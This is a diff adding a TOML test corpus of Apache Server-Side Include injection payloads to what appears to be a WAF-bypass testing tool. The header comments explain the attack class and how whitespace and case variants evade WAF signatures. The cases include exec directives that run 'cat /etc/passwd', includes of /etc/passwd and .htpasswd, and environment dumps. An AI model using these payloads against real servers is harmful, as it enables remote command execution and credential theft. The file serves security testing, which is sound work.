@@ -1,0 +1,105 @@
+schema = 1
+# Server-Side Includes (SSI) — Apache mod_include directives.
+#
+# Apache servers with `Options +Includes` (or `+IncludesNOEXEC`) treated
+# `.shtml` files (and any file matched by `AddOutputFilter INCLUDES` or
+# `XBitHack on`) as SSI templates: directives like
+# `<!--#exec cmd="..." -->` and `<!--#include file="..." -->` evaluated
+# server-side before delivery. The class is legacy but still seen on:
+# - Hosting providers serving brochure sites from Apache shared infra
+# - WordPress / Joomla / Drupal mirrors that retain `+Includes` from
+#   a 2008-era hardening guide
+# - Wiki / forum forks that still chmod the upload directory to allow
+#   SSI parsing of user-uploaded `.shtml`
+#
+# When the operator reflects user input into an HTML response on such a
+# server, the SSI parser sees the directive and runs it before flushing
+# the response. The class is RCE-equivalent on `+Includes`, file-read
+# on `+IncludesNOEXEC`.
+#
+# Bypass surface: WAFs look for the literal directive bytes
+# `<!--#exec` / `<!--#include`. The grammar mutator in
+# `wafrift-grammar::grammar::ssi` rewrites the same directive with
+# whitespace reflow, case-folded directive name, and quote-style
+# rotation — all server-evaluation-equivalent on Apache mod_include but
+# distinct on a WAF regex.
+
+# ── #exec (highest impact: shell RCE) ─────────────────────────────────
+
+[[case]]
+id = "ssi_exec_cmd_ls"
+class = "ssi"
+payload = '<!--#exec cmd="ls" -->'
+description = "Bare exec directive — confirms +Includes is on and the engine accepts unquoted directive name"
+
+[[case]]
+id = "ssi_exec_cmd_id"
+class = "ssi"
+payload = '<!--#exec cmd="id" -->'
+description = "Run `id` — confirms the SSI process runs as a real user, not nobody"
+
+[[case]]
+id = "ssi_exec_cmd_cat_passwd"
+class = "ssi"
+payload = '<!--#exec cmd="cat /etc/passwd" -->'
+description = "Read /etc/passwd through SSI exec — RCE-equivalent file read"
+
+[[case]]
+id = "ssi_exec_cgi_payload"
+class = "ssi"
+payload = '<!--#exec cgi="/cgi-bin/printenv" -->'
+description = "exec cgi= form (some Apache builds gate this differently from cmd=)"
+
+# ── #include (file read; RCE if the included file is itself SSI) ──────
+
+[[case]]
+id = "ssi_include_file_passwd"
+class = "ssi"
+payload = '<!--#include file="/etc/passwd" -->'
+description = "Local-file include — reads a relative or absolute path"
+
+[[case]]
+id = "ssi_include_virtual_admin"
+class = "ssi"
+payload = '<!--#include virtual="/admin/.htpasswd" -->'
+description = "virtual= form — Apache resolves it against the configured docroot"
+
+# ── #echo / #set / #printenv (data exfil, no shell) ───────────────────
+
+[[case]]
+id = "ssi_echo_var_doc_uri"
+class = "ssi"
+payload = '<!--#echo var="DOCUMENT_URI" -->'
+description = "Reflect a server env var — confirms SSI parser is active even when exec= is off"
+
+[[case]]
+id = "ssi_echo_var_remote_addr"
+class = "ssi"
+payload = '<!--#echo var="REMOTE_ADDR" -->'
+description = "REMOTE_ADDR — sanity probe for SSI evaluation"
+
+[[case]]
+id = "ssi_printenv"
+class = "ssi"
+payload = "<!--#printenv -->"
+description = "Dump every CGI environment variable — sensitive paths, server signatures, app config"
+
+[[case]]
+id = "ssi_config_errmsg"
+class = "ssi"
+payload = '<!--#config errmsg="SSI evaluated" -->'
+description = "config directive — sets the SSI error message; subsequent malformed SSI returns it (proof of evaluation)"
+
+# ── Whitespace / case variants the grammar mutator would also emit ────
+
+[[case]]
+id = "ssi_exec_whitespace_reflow"
+class = "ssi"
+payload = '<!--#  exec  cmd="ls"  -->'
+description = "Apache tokenises on any whitespace run — naive WAF regex anchored on single space misses"
+
+[[case]]
+id = "ssi_exec_directive_uppercase"
+class = "ssi"
+payload = '<!--#EXEC cmd="ls" -->'
+description = "Directive names are case-insensitive in mod_include — uppercase variant evades lowercase-anchored signatures"
